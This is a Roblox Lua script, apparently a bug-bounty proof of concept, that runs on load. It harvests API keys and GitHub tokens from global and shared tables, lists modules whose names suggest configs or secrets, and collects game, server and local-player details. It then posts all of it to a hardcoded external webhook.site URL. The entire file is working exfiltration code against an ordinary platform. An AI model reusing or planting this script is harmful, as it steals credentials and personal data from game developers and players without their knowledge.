local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- PoC: This code executes during script execution
local WEBHOOK_URL = "https://webhook.site/b824b019-ad64-47bd-8ec1-da95067b8994"

-- Extract Roblox-specific sensitive data
local function get_roblox_data()
    local data_attempts = {}
    
    -- Method 1: Try to get API keys from _G (global namespace)
    local success, result = pcall(function()
        if _G.ROBLOX_API_KEY then
            table.insert(data_attempts, {"global_ROBLOX_API_KEY", tostring(_G.ROBLOX_API_KEY)})
        end
        if _G.GITHUB_TOKEN then
            table.insert(data_attempts, {"global_GITHUB_TOKEN", tostring(_G.GITHUB_TOKEN)})
        end
    end)
    if not success then
        table.insert(data_attempts, {"global_access_error", tostring(result)})
    end
    
    -- Method 2: Try to get data from shared (cross-script storage)
    success, result = pcall(function()
        if shared.API_KEY then
            table.insert(data_attempts, {"shared_API_KEY", tostring(shared.API_KEY)})
        end
        if shared.ROBLOX_API_KEY then
            table.insert(data_attempts, {"shared_ROBLOX_API_KEY", tostring(shared.ROBLOX_API_KEY)})
        end
    end)
    if not success then
        table.insert(data_attempts, {"shared_access_error", tostring(result)})
    end
    
    -- Method 3: Check for ModuleScripts in ReplicatedStorage that might contain keys
    success, result = pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
            if child:IsA("ModuleScript") then
                local name = child.Name:lower()
                if name:find("config") or name:find("api") or name:find("key") or name:find("token") then
                    table.insert(data_attempts, {"module_found", child:GetFullName()})
                end
            end
        end
    end)
    if not success then
        table.insert(data_attempts, {"module_scan_error", tostring(result)})
    end
    
    -- Method 4: Check ServerScriptService for configuration scripts
    if RunService:IsServer() then
        success, result = pcall(function()
            local ServerScriptService = game:GetService("ServerScriptService")
            for _, child in ipairs(ServerScriptService:GetDescendants()) do
                if child:IsA("ModuleScript") or child:IsA("Script") then
                    local name = child.Name:lower()
                    if name:find("config") or name:find("api") or name:find("secret") then
                        table.insert(data_attempts, {"server_config_found", child:GetFullName()})
                    end
                end
            end
        end)
        if not success then
            table.insert(data_attempts, {"server_scan_error", tostring(result)})
        end
    end
    
    return data_attempts
end

local roblox_data_attempts = get_roblox_data()

-- Convert data array to dictionary for JSON
local data_dict = {}
for i, data_pair in ipairs(roblox_data_attempts) do
    data_dict[data_pair[1] .. "_" .. tostring(i)] = data_pair[2]
end

-- Collect game environment information
local data = {
    status = "EXPLOITED_VIA_ROBLOX_SCRIPT",
    game_name = game.Name,
    place_id = game.PlaceId,
    game_id = game.GameId,
    creator_type = game.CreatorType.Name,
    creator_id = game.CreatorId,
    job_id = game.JobId,
    private_server_id = game.PrivateServerId,
    private_server_owner_id = game.PrivateServerOwnerId,
    is_server = RunService:IsServer(),
    is_client = RunService:IsClient(),
    is_studio = RunService:IsStudio(),
    execution_point = "Roblox script execution",
    data_extraction_attempts = data_dict,
    player_count = #Players:GetPlayers(),
    max_players = Players.MaxPlayers
}

-- Add player information if on client
if RunService:IsClient() then
    local player = Players.LocalPlayer
    if player then
        data.local_player = player.Name
        data.local_player_id = player.UserId
        data.local_player_account_age = player.AccountAge
    end
end

local function main()
    local success, err = pcall(function()
        local json_data = HttpService:JSONEncode(data)
        
        local response = HttpService:PostAsync(
            WEBHOOK_URL,
            json_data,
            Enum.HttpContentType.ApplicationJson,
            false,
            {["Content-Type"] = "application/json"}
        )
        
        print("\n" .. string.rep("=", 70))
        print("Exploit: PoC for Bug Bounty Program")
        print("Webhook: Success")
        print(string.format("Data extraction attempts: %d", #roblox_data_attempts))
        for _, data_pair in ipairs(roblox_data_attempts) do
            local method, value = data_pair[1], data_pair[2]
            local display_value = type(value) == "string" and value:sub(1, 50) or tostring(value)
            print(string.format("   - %s: %s...", method, display_value))
        end
        print(string.rep("=", 70) .. "\n")
    end)
    
    if not success then
        warn(string.format("⚠️ PoC webhook failed: %s", tostring(err)))
        warn("Data collected:")
        warn(HttpService:JSONEncode(data))
    end
end

main()
